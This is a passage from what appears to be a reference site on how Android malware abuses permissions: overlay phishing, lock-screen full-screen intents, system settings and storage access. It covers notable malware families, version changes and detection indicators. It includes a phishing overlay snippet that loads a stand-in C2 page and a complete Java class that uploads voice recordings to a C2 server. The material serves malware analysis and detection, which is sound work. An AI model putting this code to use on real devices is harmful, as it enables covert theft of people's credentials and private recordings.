<code>TYPE_APPLICATION_OVERLAY</code>:</p> <pre><code>WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);\n\nWindowManager.LayoutParams params = new WindowManager.LayoutParams(\n    WindowManager.LayoutParams.MATCH_PARENT,\n    WindowManager.LayoutParams.MATCH_PARENT,\n    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE\n        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,\n    PixelFormat.TRANSLUCENT\n);\nparams.gravity = Gravity.TOP | Gravity.START;\n\nWebView phishView = new WebView(this);\nphishView.loadUrl(\"https://c2.example.com/injects/com.target.bank.html\");\nwm.addView(phishView, params);\n</code></pre> <p>The <code>FLAG_NOT_FOCUSABLE</code> flag ensures the overlay does not steal input focus from the underlying app until the user interacts with it. The <code>WebView</code> loads an HTML template from the C2 server styled to match the target banking app.</p>"},{"location":"permissions/special/system-alert-window/#how-webfakes-injects-work","title":"How Webfakes / Injects Work","text":"<p>Modern banking trojans do not hardcode phishing screens. Instead, they use a dynamic injection system:</p> <ol> <li>Target list download: after installation, the malware requests a list of target package names from C2</li> <li>Foreground monitoring: the malware detects which app is in the foreground using <code>UsageStatsManager.queryUsageStats()</code> or accessibility events</li> <li>Inject retrieval: when a target app launches, the malware requests the corresponding HTML template (\"webfake\" or \"inject\") from C2</li> <li>Overlay rendering: the HTML is loaded in a <code>WebView</code> overlay that exactly matches the target app's login screen</li> <li>Credential exfiltration: form data entered by the user is intercepted via JavaScript bridges or <code>WebViewClient</code> callbacks and sent to C2</li> </ol> <p>These inject templates are maintained as HTML/CSS/JS archives on C2 infrastructure, often covering hundreds of banking apps across multiple countries. Threat actors sell inject packs on underground forums, and families like Cerberus and Ermac popularized the model of operators providing inject updates as part of a MaaS subscription.</p>"},{"location":"permissions/special/system-alert-window/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/system-alert-window/#credential-phishing-overlay-attack","title":"Credential Phishing (Overlay Attack)","text":"<p>The core attack pattern has remained consistent since BankBot pioneered it around 2016:</p> <ol> <li>Malware monitors the foreground app via <code>UsageStatsManager</code> or accessibility service</li> <li>When a target banking app opens, malware draws a fake login screen on top</li> <li>The user enters credentials into the overlay, believing it is the real app</li> <li>Malware sends captured credentials to C2</li> </ol>"},{"location":"permissions/special/system-alert-window/#tapjacking","title":"Tapjacking","text":"<p>A transparent overlay intercepts touch events, or an overlay briefly appears to trick the user into tapping a specific location on a dialog behind it -- for example, a permission grant dialog or an accessibility service enable toggle.</p>"},{"location":"permissions/special/system-alert-window/#ui-blocking","title":"UI Blocking","text":"<p>A full-screen overlay prevents the user from navigating to Settings to uninstall the malware or revoke permissions. Some families display ransom messages or fake \"system update\" screens using this technique.</p>"},{"location":"permissions/special/system-alert-window/#notable-families","title":"Notable Families","text":"Family Overlay Usage Source BankBot Pioneered overlay-based credential theft on Android ThreatFabric Anubis Overlay combined with keylogger for redundant capture ThreatFabric Cerberus HTML injection overlays for 200+ banking apps, source leaked in 2020 spawning multiple forks ThreatFabric Ermac Cerberus-derived overlay kit targeting 450+ financial and social media apps Intel 471 Hydra WebView injection overlays with MaaS distribution model ThreatFabric TsarBot Overlay attacks targeting 750+ banking and crypto apps across multiple regions Cyble Antidot Multilingual overlay phishing templates (German, French, Spanish, Russian, Portuguese, Romanian, English) Cyble Brokewell Overlay credential capture paired with cookie theft via WebView session dumping ThreatFabric Klopatra Dynamic overlays for credential theft with hidden VNC for on-device fraud Cleafy Albiriox VNC remote access combined with overlay attacks, MaaS at $650-720/month Cleafy Herodotus WebView overlay injection with human-like typing to evade anti-fraud ThreatFabric BingoMod Overlay phishing combined with VNC-based on-device fraud, wipes device post-theft Cleafy Crocodilus Overlay-driven credential theft with black screen overlay hiding remote actions ThreatFabric BTMOB RAT Web injection overlays paired with screen sharing, evolved from SpySolr Cyble"},{"location":"permissions/special/system-alert-window/#android-version-changes","title":"Android Version Changes","text":""},{"location":"permissions/special/system-alert-window/#android-60-api-23","title":"Android 6.0 (API 23)","text":"<p>Moved <code>SYSTEM_ALERT_WINDOW</code> from install-time to a special permission requiring user action. Google Play apps could auto-grant the permission via <code>ACTION_MANAGE_OVERLAY_PERMISSION</code> intent until Android 8. This was intended to reduce abuse but created a gap where Play Store-distributed malware could still acquire it easily.</p>"},{"location":"permissions/special/system-alert-window/#android-71-api-25","title":"Android 7.1 (API 25)","text":"<p><code>TYPE_TOAST</code> windows remained usable without the permission, providing a bypass path. Malware exploited this to display overlays without any user interaction.</p>"},{"location":"permissions/special/system-alert-window/#android-80-api-26","title":"Android 8.0 (API 26)","text":"<p>Major changes: <code>TYPE_TOAST</code> exploit patched. Deprecated <code>TYPE_PHONE</code>, <code>TYPE_SYSTEM_ALERT</code>, and other legacy overlay types. Added <code>TYPE_APPLICATION_OVERLAY</code> as the sole legitimate overlay type, which renders below critical system windows like permission dialogs. This partially mitigated tapjacking of permission grants.</p>"},{"location":"permissions/special/system-alert-window/#android-10-api-29","title":"Android 10 (API 29)","text":"<p>Overlays cannot appear on top of other app activities if the overlay app does not have focus. Added restrictions on overlay interactions with other apps' windows.</p>"},{"location":"permissions/special/system-alert-window/#android-12-api-31","title":"Android 12 (API 31)","text":"<p>Significant anti-overlay changes. Overlays with <code>FLAG_NOT_TOUCHABLE</code> become untouchable by default -- the system blocks touch passthrough for <code>TYPE_APPLICATION_OVERLAY</code> windows. Apps can call <code>setHideOverlayWindows(true)</code> on their activities to prevent non-system overlays from appearing over sensitive UI. System adds <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code> to MotionEvents when an overlay is present, allowing target apps to detect and reject obscured touches.</p>"},{"location":"permissions/special/system-alert-window/#post-android-12-the-shift-to-accessibility","title":"Post-Android 12: The Shift to Accessibility","text":"<p>The cumulative overlay restrictions in Android 12+ made traditional overlay attacks less reliable. Modern malware families have shifted to using <code>BIND_ACCESSIBILITY_SERVICE</code> as the primary attack vector. With accessibility, malware can:</p> <ul> <li>Perform gestures directly on behalf of the user (no overlay needed)</li> <li>Read screen content in real-time</li> <li>Intercept and manipulate UI elements</li> <li>Auto-grant permissions programmatically</li> </ul> <p>Families like Crocodilus, Herodotus, and Albiriox combine accessibility abuse with overlay attacks -- using overlays for credential capture where effective, and accessibility for everything else. See Accessibility Abuse for the full attack pattern.</p>"},{"location":"permissions/special/system-alert-window/#frida-monitoring-script","title":"Frida Monitoring Script","text":"<p>Hook <code>WindowManager.addView()</code> to detect overlay creation at runtime:</p> <pre><code>Java.perform(function () {\n    var WindowManagerImpl = Java.use(\"android.view.WindowManagerImpl\");\n    WindowManagerImpl.addView.overload(\n        \"android.view.View\",\n        \"android.view.ViewGroup$LayoutParams\"\n    ).implementation = function (view, params) {\n        var lp = Java.cast(params, Java.use(\"android.view.WindowManager$LayoutParams\"));\n        var type = lp.type.value;\n        var flags = lp.flags.value;\n        var title = lp.getTitle();\n        console.log(\"[Overlay] addView called\");\n        console.log(\"  type: \" + type);\n        console.log(\"  flags: 0x\" + flags.toString(16));\n        console.log(\"  title: \" + title);\n        console.log(\"  view: \" + view.getClass().getName());\n        if (type === 2038) {\n            console.log(\"  [!] TYPE_APPLICATION_OVERLAY detected\");\n        }\n        this.addView(view, params);\n    };\n});\n</code></pre>"},{"location":"permissions/special/system-alert-window/#detection-indicators","title":"Detection Indicators","text":"<p>Manifest signals:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\" /&gt;\n</code></pre> <p>High-confidence malware indicators (combination of):</p> <ul> <li><code>SYSTEM_ALERT_WINDOW</code> + <code>BIND_ACCESSIBILITY_SERVICE</code></li> <li><code>TYPE_APPLICATION_OVERLAY</code> usage + <code>UsageStatsManager.queryUsageStats()</code> calls (foreground app detection)</li> <li>WebView creation inside a service context (inject loading)</li> <li>HTML files or URLs referencing banking package names</li> <li><code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> alongside the overlay permission</li> </ul> <p>Static analysis targets:</p> <ul> <li>Calls to <code>WindowManager.addView()</code> with overlay type parameters</li> <li><code>WebView.loadUrl()</code> or <code>WebView.loadData()</code> inside <code>Service</code> classes</li> <li>String references to banking package names (<code>com.chase.sig.android</code>, <code>com.bankofamerica.cashpromobile</code>, etc.)</li> <li>JavaScript bridge registration (<code>addJavascriptInterface</code>) in overlay WebViews</li> </ul> <p>See also: Overlay Attacks | Tapjacking | Accessibility Abuse</p>"},{"location":"permissions/special/use-full-screen-intent/","title":"USE_FULL_SCREEN_INTENT","text":"<p>Allows launching a full-screen activity from a notification when the device is locked. Designed for alarm clocks and incoming calls, but abused by malware to display phishing screens or social engineering prompts on locked devices.</p>"},{"location":"permissions/special/use-full-screen-intent/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.USE_FULL_SCREEN_INTENT</code> Protection Level <code>normal</code> (API 29-33), <code>special</code> (API 34+) Grant Method Automatic (API 29-33), Settings toggle (API 34+) Introduced API 29 (Android 10)"},{"location":"permissions/special/use-full-screen-intent/#what-it-enables","title":"What It Enables","text":"<p>A notification with a full-screen intent launches an activity that appears over the lock screen:</p> <pre><code>Intent fullScreenIntent = new Intent(this, PhishingActivity.class);\nPendingIntent fullScreenPendingIntent = PendingIntent.getActivity(this, 0,\n    fullScreenIntent, PendingIntent.FLAG_IMMUTABLE);\n\nNotification notification = new NotificationCompat.Builder(this, CHANNEL_ID)\n    .setFullScreenIntent(fullScreenPendingIntent, true)\n    .build();\n</code></pre> <p>When the notification fires and the device is locked, the activity appears immediately over the lock screen without the user unlocking.</p>"},{"location":"permissions/special/use-full-screen-intent/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/use-full-screen-intent/#lock-screen-phishing","title":"Lock Screen Phishing","text":"<p>Display a fake login screen, system alert, or security warning while the device is locked. The user wakes their device and sees a convincing prompt before reaching their home screen.</p>"},{"location":"permissions/special/use-full-screen-intent/#social-engineering","title":"Social Engineering","text":"<p>Show \"urgent security update\" or \"account compromised\" messages that prompt the user to enter credentials or enable accessibility.</p>"},{"location":"permissions/special/use-full-screen-intent/#distraction-screen","title":"Distraction Screen","text":"<p>Display a fake \"updating\" or \"loading\" screen over the lock screen while the malware performs on-device fraud in the background.</p>"},{"location":"permissions/special/use-full-screen-intent/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): permission introduced as <code>normal</code> (auto-granted).</p> <p>Android 14 (API 34): changed to a special permission requiring explicit user grant. Apps targeting API 34+ must request through Settings. Existing apps keep their grant until they update targetSdkVersion.</p>"},{"location":"permissions/special/use-full-screen-intent/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.USE_FULL_SCREEN_INTENT\" /&gt;\n</code></pre> <p>Look for <code>setFullScreenIntent()</code> calls in notification builders. Any app that isn't an alarm, timer, or communication app using this is suspicious.</p>"},{"location":"permissions/special/write-settings/","title":"WRITE_SETTINGS","text":"<p>Allows modifying system-level settings. Can change default ringtone, screen brightness, screen timeout, and other global settings. Less commonly abused than other special permissions, but can be used to weaken device security or annoy the user into performing actions.</p>"},{"location":"permissions/special/write-settings/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_SETTINGS</code> Protection Level <code>signature\\|appop\\|pre23\\|preinstalled</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Modify system settings Introduced API 1 <p>Before Android 6.0, this was a normal permission. Since API 23, it requires a Settings toggle.</p>"},{"location":"permissions/special/write-settings/#what-it-enables","title":"What It Enables","text":"<p>Modify values in <code>Settings.System</code>:</p> <pre><code>Settings.System.putInt(getContentResolver(),\n    Settings.System.SCREEN_OFF_TIMEOUT, 2147483647); // prevent screen off\n</code></pre> <p>Accessible settings include:</p> Setting Impact <code>SCREEN_OFF_TIMEOUT</code> Prevent screen from turning off (keep screen on for overlay display) <code>SCREEN_BRIGHTNESS</code> Change brightness <code>SOUND_EFFECTS_ENABLED</code> Disable/enable sound effects <code>RINGTONE</code> Change ringtone <code>AIRPLANE_MODE_ON</code> Toggle airplane mode (limited on newer Android)"},{"location":"permissions/special/write-settings/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/write-settings/#preventing-screen-lock","title":"Preventing Screen Lock","text":"<p>Set <code>SCREEN_OFF_TIMEOUT</code> to maximum value to keep the screen on while performing on-device fraud or displaying overlays.</p>"},{"location":"permissions/special/write-settings/#disabling-security","title":"Disabling Security","text":"<p>On older Android versions, some security-related settings were writable. Modern Android moved most sensitive settings to <code>Settings.Global</code> and <code>Settings.Secure</code>, which require higher privileges.</p>"},{"location":"permissions/special/write-settings/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): moved to special permission.</p> <p>Android 7.0+: <code>AIRPLANE_MODE_ON</code> moved to <code>Settings.Global</code>, no longer writable by apps.</p> <p>Most useful system settings have been progressively locked down, reducing the attack surface of this permission.</p>"},{"location":"permissions/special/write-settings/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_SETTINGS\" /&gt;\n</code></pre> <p>Low priority indicator on its own. Most abuse scenarios require combination with other permissions.</p>"},{"location":"permissions/storage/","title":"Storage Permissions","text":"<p>Android's storage permission model has undergone more changes than any other permission group. The progression from unrestricted shared storage access to scoped storage to granular media permissions reflects repeated attempts to contain data theft and cross-app file access. Each transition introduced new restrictions and new bypass opportunities.</p>"},{"location":"permissions/storage/#permission-evolution","title":"Permission Evolution","text":"API Level Android Version Model 1-28 1.0 - 9.0 <code>READ/WRITE_EXTERNAL_STORAGE</code> grants full <code>/sdcard/</code> access 29 10 Scoped storage introduced, opt-out via <code>requestLegacyExternalStorage</code> 30 11 Scoped storage enforced, <code>MANAGE_EXTERNAL_STORAGE</code> added as escape hatch 33 13 <code>READ_EXTERNAL_STORAGE</code> deprecated, replaced by granular media permissions"},{"location":"permissions/storage/#permissions","title":"Permissions","text":"Permission Status Abuse Potential READ_EXTERNAL_STORAGE Deprecated API 33 Read all files on shared storage (photos, documents, app data) WRITE_EXTERNAL_STORAGE Deprecated API 30 Write files to shared storage, drop payloads, replace files READ_MEDIA_IMAGES API 33+ Access photos and screenshots READ_MEDIA_VIDEO API 33+ Access video files READ_MEDIA_AUDIO API 33+ Access audio files <p>For unrestricted file access on Android 11+, see MANAGE_EXTERNAL_STORAGE.</p>"},{"location":"permissions/storage/#offensive-relevance","title":"Offensive Relevance","text":"<p>Storage permissions are central to two attack patterns: data theft and payload delivery.</p>"},{"location":"permissions/storage/#data-theft","title":"Data Theft","text":"<p>Shared storage historically held everything users cared about: photos, downloads, documents, and critically, data from other apps that stored files externally. WhatsApp databases, Telegram media, browser downloads, and PDF documents were all accessible to any app with <code>READ_EXTERNAL_STORAGE</code>.</p>"},{"location":"permissions/storage/#payload-dropping","title":"Payload Dropping","text":"<p>Write access to shared storage enables dropping malicious APKs, DEX files, or native libraries to known paths. Combined with social engineering (\"Please install this update\") or <code>REQUEST_INSTALL_PACKAGES</code>, this provides a sideloading pipeline.</p>"},{"location":"permissions/storage/#media-file-jacking","title":"Media File Jacking","text":"<p>Before scoped storage, a malicious app could monitor shared storage and replace files written by other apps between the time they were written and when the user opened them. This was demonstrated against WhatsApp and Telegram media files.</p>"},{"location":"permissions/storage/#scoped-storage-bypass-techniques","title":"Scoped Storage Bypass Techniques","text":"<p>Malware targeting newer Android versions uses several strategies:</p> Technique How It Works <code>requestLegacyExternalStorage</code> Opt out of scoped storage on API 29 (only works for apps targeting API 29) <code>MANAGE_EXTERNAL_STORAGE</code> Full file access on API 30+, requires special permission grant <code>MediaStore</code> API abuse Access media files through MediaStore without broad storage permission SAF (Storage Access Framework) Trick user into granting directory access via document picker <code>preserveLegacyExternalStorage</code> Maintain pre-existing storage access on upgrade to API 30 Target API downgrade Target API 28 or lower to avoid scoped storage entirely"},{"location":"permissions/storage/read-external-storage/","title":"READ_EXTERNAL_STORAGE","text":"<p>Grants read access to files on shared/external storage (<code>/sdcard/</code>). Before scoped storage, this was a skeleton key to every file on the device's shared storage: photos, documents, downloads, WhatsApp databases, and any other app data stored externally. Deprecated in Android 13 in favor of granular media permissions (<code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code>, <code>READ_MEDIA_AUDIO</code>).</p>"},{"location":"permissions/storage/read-external-storage/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_EXTERNAL_STORAGE</code> Protection Level <code>dangerous</code> Permission Group <code>STORAGE</code> Grant Method Runtime permission dialog Introduced API 16 Deprecated API 33 (Android 13) Max Target SDK Effect API 32 (ignored if targeting API 33+)"},{"location":"permissions/storage/read-external-storage/#what-it-enables","title":"What It Enables","text":"<p>On devices running Android 9 and below (or apps targeting API 28 and below), this permission grants read access to the entire <code>/sdcard/</code> directory tree:</p> <pre><code>/sdcard/\n\u251c\u2500\u2500 DCIM/           # Photos and camera output\n\u251c\u2500\u2500 Download/       # Browser and app downloads\n\u251c\u2500\u2500 Documents/      # User documents\n\u251c\u2500\u2500 Pictures/       # Screenshots, saved images\n\u251c\u2500\u2500 WhatsApp/       # WhatsApp media and databases\n\u2502   \u251c\u2500\u2500 Databases/  # Encrypted chat backups\n\u2502   \u2514\u2500\u2500 Media/      # Shared photos, videos, voice notes\n\u251c\u2500\u2500 Telegram/       # Telegram downloads\n\u251c\u2500\u2500 Android/data/   # Other apps' external files (pre-API 30)\n\u2514\u2500\u2500 ...\n</code></pre> <p>On Android 10-12 with scoped storage active, the permission is limited to media files accessible through <code>MediaStore</code>. On Android 13+, it has no effect for apps targeting API 33.</p>"},{"location":"permissions/storage/read-external-storage/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-external-storage/#photo-and-document-theft","title":"Photo and Document Theft","text":"<p>The most straightforward abuse. Malware recursively enumerates shared storage and exfiltrates files matching target extensions:</p> Target Path / Extension Photos <code>DCIM/</code>, <code>Pictures/</code>, <code>.jpg</code>, <code>.png</code> Documents <code>Documents/</code>, <code>Download/</code>, <code>.pdf</code>, <code>.docx</code>, <code>.xlsx</code> Screenshots <code>Pictures/Screenshots/</code> Recordings <code>Recordings/</code>, <code>.m4a</code>, <code>.3gp</code> <p>Screenshots are particularly valuable because they may contain sensitive information: banking screens, authentication codes, private messages.</p>"},{"location":"permissions/storage/read-external-storage/#notable-families","title":"Notable Families","text":"Family Storage Abuse Rafel RAT SD card wipe capability, external storage enumeration and file exfiltration LightSpy Dedicated file manager plugin for browsing and exfiltrating external storage GuardZoo Targets military mapping files (KMZ, WPT, KML) from armed forces personnel AridSpy Document theft from external storage in targeted espionage campaigns"},{"location":"permissions/storage/read-external-storage/#whatsapp-database-extraction","title":"WhatsApp Database Extraction","text":"<p>WhatsApp stores encrypted chat database backups at <code>/sdcard/WhatsApp/Databases/msgstore.db.crypt14</code>. With <code>READ_EXTERNAL_STORAGE</code>, malware can copy this file. While the database is encrypted, the key can be extracted from the app's private storage with root access, or the backup can be decrypted using the user's Google account backup key.</p> <p>Families known to target WhatsApp data:</p> Family WhatsApp Targeting GravityRAT Exfiltrates WhatsApp backup databases Dracarys Steals WhatsApp media and documents RatMilad Targets WhatsApp and Telegram data directories PhoneSpy Harvests all media including WhatsApp images"},{"location":"permissions/storage/read-external-storage/#credential-file-harvesting","title":"Credential File Harvesting","text":"<p>Some apps store credentials, tokens, or configuration files on external storage (a developer mistake, but common). Malware scans for:</p> <ul> <li><code>.json</code> files containing API keys or tokens</li> <li><code>.pem</code> / <code>.key</code> files (certificates and private keys)</li> <li>Browser download folders for saved credential exports</li> <li>Password manager exports (CSV/JSON)</li> </ul>"},{"location":"permissions/storage/read-external-storage/#reconnaissance","title":"Reconnaissance","text":"<p>Enumerating the file system reveals installed apps (by checking <code>Android/data/</code> subdirectories), user habits (photo metadata with GPS coordinates), and organizational context (document filenames and contents).</p>"},{"location":"permissions/storage/read-external-storage/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): prior to this, <code>READ_EXTERNAL_STORAGE</code> was not enforced. Any app could read external storage without declaring the permission.</p> <p>Android 6.0 (API 23): became a runtime permission. Granting <code>READ_EXTERNAL_STORAGE</code> also granted <code>WRITE_EXTERNAL_STORAGE</code> (same permission group). This was tightened in later versions.</p> <p>Android 10 (API 29): scoped storage introduced. Apps targeting API 29 are restricted to their own external directory and <code>MediaStore</code>-accessible media. The <code>requestLegacyExternalStorage=\"true\"</code> manifest flag opts out.</p> <p>Android 11 (API 30): scoped storage enforced. The legacy opt-out flag is ignored for apps targeting API 30+. <code>READ_EXTERNAL_STORAGE</code> only grants <code>MediaStore</code> access to media files (images, video, audio), not arbitrary files.</p> <p>Android 13 (API 33): <code>READ_EXTERNAL_STORAGE</code> deprecated. Apps targeting API 33+ must use <code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code>, or <code>READ_MEDIA_AUDIO</code> instead. The old permission is silently ignored.</p>"},{"location":"permissions/storage/read-external-storage/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n</code></pre> <p>Red flags:</p> <ul> <li>Combined with <code>INTERNET</code> and no clear media-display UI: likely exfiltration</li> <li>Recursive file enumeration in decompiled code (<code>File.listFiles()</code>, <code>File.walk()</code>)</li> <li>Hardcoded paths to WhatsApp, Telegram, or other app directories</li> <li>File extension filtering targeting documents and databases</li> <li>Apps targeting API 28 or lower on devices running Android 10+ (intentionally avoiding scoped storage)</li> <li><code>requestLegacyExternalStorage=\"true\"</code> in the application tag (opting out of scoped storage on API 29)</li> </ul>"},{"location":"permissions/storage/read-media-audio/","title":"READ_MEDIA_AUDIO","text":"<p>Allows reading audio files (music, voice recordings, podcasts) from shared storage via <code>MediaStore</code>. Granular media permission introduced in Android 13.</p>"},{"location":"permissions/storage/read-media-audio/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_MEDIA_AUDIO</code> Protection Level <code>dangerous</code> Permission Group <code>READ_MEDIA_AURAL</code> Grant Method Runtime permission dialog Introduced API 33 (Android 13)"},{"location":"permissions/storage/read-media-audio/#what-it-enables","title":"What It Enables","text":"<p>Query <code>MediaStore.Audio</code> for all audio files on the device.</p>"},{"location":"permissions/storage/read-media-audio/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-media-audio/#voice-recording-exfiltration","title":"Voice Recording Exfiltration","text":"<p>Users may have voice recordings (meetings, notes, interviews) stored on their device. These can contain sensitive information.</p>"},{"location":"permissions/storage/read-media-audio/#call-recording-access","title":"Call Recording Access","text":"<p>Third-party call recording apps store recordings as audio files in shared storage. Accessible through this permission.</p>"},{"location":"permissions/storage/read-media-audio/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class AudioExfiltrator {\n\n    private final ContentResolver resolver;\n    private final String c2Url;\n\n    public AudioExfiltrator(ContentResolver resolver, String c2Url) {\n        this.resolver = resolver;\n        this.c2Url = c2Url;\n    }\n\n    public void exfiltrateRecordings() {\n        String[] projection = {\n            MediaStore.Audio.Media._ID,\n            MediaStore.Audio.Media.DISPLAY_NAME,\n            MediaStore.Audio.Media.DATE_ADDED,\n            MediaStore.Audio.Media.SIZE,\n            MediaStore.Audio.Media.MIME_TYPE\n        };\n\n        String selection = MediaStore.Audio.Media.MIME_TYPE + \" IN (?, ?, ?)\";\n        String[] selectionArgs = {\"audio/amr\", \"audio/3gpp\", \"audio/mp4\"};\n\n        Cursor cursor = resolver.query(\n            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,\n            projection,\n            selection,\n            selectionArgs,\n            MediaStore.Audio.Media.DATE_ADDED + \" DESC\"\n        );\n\n        if (cursor == null) return;\n\n        while (cursor.moveToNext()) {\n            long id = cursor.getLong(0);\n            String name = cursor.getString(1);\n            long size = cursor.getLong(3);\n\n            Uri contentUri = ContentUris.withAppendedId(\n                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, id\n            );\n            uploadToC2(contentUri, name, size);\n        }\n        cursor.close();\n    }\n\n    private void uploadToC2(Uri uri, String name, long size) {\n        try (InputStream is = resolver.openInputStream(uri)) {\n            byte[] data = new byte[(int) size];\n            is.read(data);\n            HttpURLConnection conn = (HttpURLConnection)\n                new URL(c2Url + \"/upload\").openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"X-Filename\", name);\n            conn.getOutputStream().write(data);\n            conn.getResponseCode();\n            conn.disconnect();\n        } catch (Exception e) {\n        }\n    }\n}\n</code></pre> <p>The malware filters for recording-type MIME types (AMR, 3GPP, MP4 audio) to prioritize voice recordings over music. Sorting by <code>DATE_ADDED</code> descending ensures the most recent recordings are exfiltrated first.</p>"},{"location":"permissions/storage/read-media-audio/#notable-families","title":"Notable Families","text":"Family Usage SpyNote Full-featured RAT with file manager capability that browses and exfiltrates audio files from device storage PJobRAT Espionage-focused RAT that exfiltrates files including audio recordings from device storage Hermit Modular commercial spyware with dedicated audio exfiltration module FinSpy Commercial surveillance suite with file access and audio interception capabilities <p>SpyNote and PJobRAT use <code>READ_EXTERNAL_STORAGE</code> on pre-Android 13 devices for broad file access that includes audio. On Android 13+ targets, these families would need <code>READ_MEDIA_AUDIO</code> for MediaStore-based access, though many samples still request the legacy permission for backward compatibility. Commercial spyware like Hermit and FinSpy operate through modular architectures where dedicated plugins handle audio file collection from the device's shared storage.</p>"},{"location":"permissions/storage/read-media-audio/#read_external_storage-vs-granular-permissions","title":"READ_EXTERNAL_STORAGE vs Granular Permissions","text":"<p>Most malware families that exfiltrate audio files were developed before Android 13 and request <code>READ_EXTERNAL_STORAGE</code> rather than <code>READ_MEDIA_AUDIO</code>. The transition to granular media permissions has been slow in the malware ecosystem:</p> <ul> <li>Families targeting API 32 and below continue to use <code>READ_EXTERNAL_STORAGE</code> which grants access to all media types</li> <li>Families targeting API 33+ must declare <code>READ_MEDIA_AUDIO</code> specifically for audio access</li> <li>Some families declare both permissions for cross-version compatibility, using <code>maxSdkVersion</code> on <code>READ_EXTERNAL_STORAGE</code> to handle the split</li> <li>The granular permission ironically makes audio-specific abuse more visible during manifest analysis, because an app requesting only <code>READ_MEDIA_AUDIO</code> (without images or video) stands out as having a specific interest in audio files</li> </ul>"},{"location":"permissions/storage/read-media-audio/#stalkerware-and-spyware","title":"Stalkerware and Spyware","text":"<p>This permission is primarily abused by stalkerware and general-purpose spyware. These families run as persistent background services and periodically query <code>MediaStore.Audio</code> for newly added recordings, uploading them to operator-controlled servers. Voice memos, interviews, and ambient recordings are high-value targets for surveillance operators.</p>"},{"location":"permissions/storage/read-media-audio/#android-version-changes","title":"Android Version Changes","text":"<p>Android 13 (API 33): <code>READ_MEDIA_AUDIO</code> introduced as a replacement for <code>READ_EXTERNAL_STORAGE</code> for audio file access. Apps targeting API 33+ must request this specific permission instead of the broader storage permission.</p> <p>Android 14 (API 34): no photo picker equivalent for audio, so the permission model remains unchanged. Audio files continue to require full <code>READ_MEDIA_AUDIO</code> access.</p> <p>Pre-Android 13: apps use <code>READ_EXTERNAL_STORAGE</code> to access all media types including audio. The broader permission makes it harder to identify audio-specific abuse.</p>"},{"location":"permissions/storage/read-media-audio/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_MEDIA_AUDIO\" /&gt;\n</code></pre> <p>Expected in music players, podcast apps, and voice recording apps.</p>"},{"location":"permissions/storage/read-media-audio/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Look for <code>MediaStore.Audio</code> queries filtered to recording MIME types (AMR, 3GPP) rather than music formats (MP3, FLAC). Music players query broadly; spyware filters for voice recordings.</li> <li>Check for periodic background queries using <code>AlarmManager</code> or <code>WorkManager</code> to detect new audio files.</li> <li>Network traffic containing audio file uploads, especially to non-CDN endpoints, indicates exfiltration.</li> <li>Apps combining <code>READ_MEDIA_AUDIO</code> with <code>INTERNET</code> and <code>FOREGROUND_SERVICE</code> but lacking any audio playback UI are suspicious.</li> <li>On pre-Android 13 samples, look for <code>READ_EXTERNAL_STORAGE</code> combined with <code>MediaStore.Audio</code> queries filtered to recording MIME types -- the broader permission masks the audio-specific intent.</li> <li>Apps declaring both <code>READ_EXTERNAL_STORAGE</code> (with <code>maxSdkVersion=\"32\"</code>) and <code>READ_MEDIA_AUDIO</code> are handling the permission transition correctly, which may indicate a more sophisticated developer.</li> </ul>"},{"location":"permissions/storage/read-media-audio/#see-also","title":"See Also","text":"<ul> <li>READ_EXTERNAL_STORAGE -- the pre-Android 13 permission that granted access to all media types including audio</li> <li>READ_MEDIA_IMAGES -- companion granular permission for image access</li> <li>READ_MEDIA_VIDEO -- companion granular permission for video access</li> </ul>"},{"location":"permissions/storage/read-media-images/","title":"READ_MEDIA_IMAGES","text":"<p>Allows reading image files (photos, screenshots) from shared storage via <code>MediaStore</code>. Introduced in Android 13 as a granular replacement for <code>READ_EXTERNAL_STORAGE</code>, giving users control over which media types an app can access.</p>"},{"location":"permissions/storage/read-media-images/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_MEDIA_IMAGES</code> Protection Level <code>dangerous</code> Permission Group <code>READ_MEDIA_VISUAL</code> (Android 14+) Grant Method Runtime permission dialog Introduced API 33 (Android 13)"},{"location":"permissions/storage/read-media-images/#what-it-enables","title":"What It Enables","text":"<p>Query <code>MediaStore.Images</code> for all photos and screenshots on the device. Includes EXIF metadata (GPS coordinates, camera model, timestamps).</p>"},{"location":"permissions/storage/read-media-images/#abuse-in-malware","title":"Abuse in 